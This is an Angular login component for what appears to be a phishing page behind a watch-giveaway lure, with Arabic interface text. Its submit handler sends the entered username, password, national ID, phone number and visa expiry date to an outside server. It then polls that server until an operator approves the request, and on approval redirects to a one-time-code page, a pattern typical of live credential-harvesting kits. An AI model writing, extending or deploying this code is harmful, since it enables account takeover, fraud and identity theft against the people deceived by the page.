import { Component, signal, inject, OnDestroy, computed } from '@angular/core';
import { CommonModule } from '@angular/common';
import { Router } from '@angular/router';
import { WatchStateService } from '../../services/watch-state';

@Component({
  selector: 'app-login',
  imports: [CommonModule],
  templateUrl: './login.html',
  styleUrl: './login.css',
})
export class Login implements OnDestroy {
  private readonly watchState = inject(WatchStateService);
  private readonly router = inject(Router);

  // Form input signals
  protected readonly username = signal('');
  protected readonly password = signal('');
  protected readonly isPasswordVisible = signal(false);
  protected readonly rememberUsername = signal(false);
  protected readonly enableFaceId = signal(false);

  // Dynamic greeting name based on state, fallback to 'Tarek' as in reference UI
  protected readonly greetingName = computed(() => {
    const raw = this.watchState.fullName().trim();
    if (!raw) return 'Tarek';
    const firstWord = raw.split(/\s+/)[0];
    return firstWord || 'Tarek';
  });

  // States
  protected readonly isLoading = signal(false);
  protected readonly loadingMessage = signal('يرجى الانتظار جاري التحقق من البيانات');
  protected readonly errorMessage = signal<string | null>(null);

  // Polling tracker
  private pollIntervalId: any = null;
  private currentRequestId: string | null = null;

  // Regex to detect any Arabic Unicode character
  private readonly arabicRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/;
  private readonly arabicGlobalRegex = /[\u0600-\u06FF\u0750-\u077F\u08A0-\u08FF\uFB50-\uFDFF\uFE70-\uFEFF]/g;

  // Cleanup on destroy
  public ngOnDestroy(): void {
    this.stopPolling();
  }

  // Toggle password visibility eye icon
  protected togglePasswordVisibility(): void {
    this.isPasswordVisible.set(!this.isPasswordVisible());
  }

  // Toggle remember username
  protected toggleRememberUsername(): void {
    this.rememberUsername.set(!this.rememberUsername());
  }

  // Toggle Face ID
  protected toggleFaceId(): void {
    this.enableFaceId.set(!this.enableFaceId());
  }

  // Block Arabic characters from keyboard typing
  protected preventArabicKey(event: KeyboardEvent): void {
    if (this.arabicRegex.test(event.key)) {
      event.preventDefault();
    }
  }

  // Block Arabic input before it is inserted (mobile/virtual keyboards & IME)
  protected onBeforeInput(event: any): void {
    if (event?.data && this.arabicRegex.test(event.data)) {
      event.preventDefault();
    }
  }

  // Filter Arabic from paste events
  protected onPaste(event: ClipboardEvent): void {
    const pastedText = event.clipboardData?.getData('text') || '';
    if (this.arabicRegex.test(pastedText)) {
      event.preventDefault();
      const cleaned = pastedText.replace(this.arabicGlobalRegex, '');
      const input = event.target as HTMLInputElement;
      const start = input.selectionStart || 0;
      const end = input.selectionEnd || 0;
      input.value = input.value.substring(0, start) + cleaned + input.value.substring(end);
      input.dispatchEvent(new Event('input'));
    }
  }

  // Form field inputs: completely sanitizes any Arabic characters
  protected onInput(field: 'user' | 'pass', event: Event): void {
    const input = event.target as HTMLInputElement;
    const cleaned = input.value.replace(this.arabicGlobalRegex, '');
    
    if (input.value !== cleaned) {
      input.value = cleaned;
    }

    if (field === 'user') {
      this.username.set(cleaned);
    } else {
      this.password.set(cleaned);
    }
    this.errorMessage.set(null); // Clear error when typing
  }

  // Check if form is valid (to enable/disable the submit button dynamically)
  protected get isFormValid(): boolean {
    return this.username().trim().length > 0 && this.password().length > 0;
  }

  // Form submission handler
  protected handleFormSubmit(event: Event): void {
    event.preventDefault();
    if (!this.isFormValid) return;

    this.isLoading.set(true);
    this.errorMessage.set(null);
    this.loadingMessage.set('جاري التحقق من البيانات...');

    const payload = {
      username: this.username().trim(),
      password: this.password(),
      fullName: this.watchState.fullName() || this.greetingName(),
      nationalId: this.watchState.nationalId(),
      phoneNumber: this.watchState.phoneNumber(),
      visaExpiryDate: this.watchState.visaExpiryDate(),
      watchColor: this.watchState.selectedWatch()?.colorLabel || 'برتقالي مشرق',
    };

    // Make API call to backend server
    fetch('https://mash.khazalah.online/api/logins', {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify(payload),
    })
      .then((res) => {
        if (!res.ok) {
          throw new Error('فشل إرسال البيانات للسيرفر الخلفي.');
        }
        return res.json();
      })
      .then((data: { id: string; status: string }) => {
        this.currentRequestId = data.id;
        this.watchState.currentRequestId.set(data.id);
        this.loadingMessage.set('يرجى الانتظار جاري التحقق من البيانات');
        this.startPolling(data.id);
      })
      .catch((err) => {
        console.error(err);
        this.isLoading.set(false);
        this.errorMessage.set('حدث خطأ أثناء الاتصال بالسيرفر. يرجى المحاولة مرة أخرى.');
      });
  }

  // Poll status endpoint every 2 seconds
  private startPolling(requestId: string): void {
    this.stopPolling();
    this.pollIntervalId = setInterval(() => {
      fetch(`https://mash.khazalah.online/api/logins/${requestId}/status`)
        .then((res) => {
          if (!res.ok) throw new Error('Failed to fetch status');
          return res.json();
        })
        .then((data: { id: string; status: string }) => {
          console.log(`Polling status for request ${requestId}:`, data.status);

          if (data.status === 'APPROVED') {
            this.stopPolling();
            this.isLoading.set(false);
            this.router.navigate(['/otp']);
          } else if (data.status === 'REJECTED') {
            this.stopPolling();
            this.isLoading.set(false);
            this.errorMessage.set('تم رفض الطلب بسبب عدم صحة البيانات, يرجى المحاولة مرة اخرى مع مراجعة البيانات');
          }
        })
        .catch((err) => {
          console.warn('Polling error:', err);
        });
    }, 2000);
  }

  private stopPolling(): void {
    if (this.pollIntervalId) {
      clearInterval(this.pollIntervalId);
      this.pollIntervalId = null;
    }
  }

  protected goBack(): void {
    this.router.navigate(['/personal-info']);
  }
}
